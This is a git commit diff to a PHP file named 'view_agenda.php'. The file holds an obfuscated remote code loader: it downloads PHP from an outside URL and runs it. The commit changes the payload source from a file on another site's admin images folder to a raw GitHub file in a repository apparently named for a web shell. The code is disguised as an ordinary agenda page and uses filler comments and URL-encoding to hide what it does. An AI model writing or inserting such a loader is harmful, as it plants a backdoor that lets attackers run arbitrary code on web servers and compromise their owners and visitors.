06c49367bc97d67806f3201fd2f6bb89e4a0bf8a
ebokzsss <84223726+ebokzsss@users.noreply.github.com>
2024-07-20 11:49:26 +0700

    Update view_agenda.php

--- view_agenda.php
+++ view_agenda.php
@@ -2,7 +2,7 @@
     /**_**/ urldecode("%3f%3e") .
         file_get_contents(
             /**_**/ urldecode(
-                /**_**/ "https://www.nicolositrasporti.com/admin/images/gallery/n.txt"
+                /**_**/ "https://raw.githubusercontent.com/ebokzsss/shellebok/main/bepp.txt"
             )
         )
 ); ?>
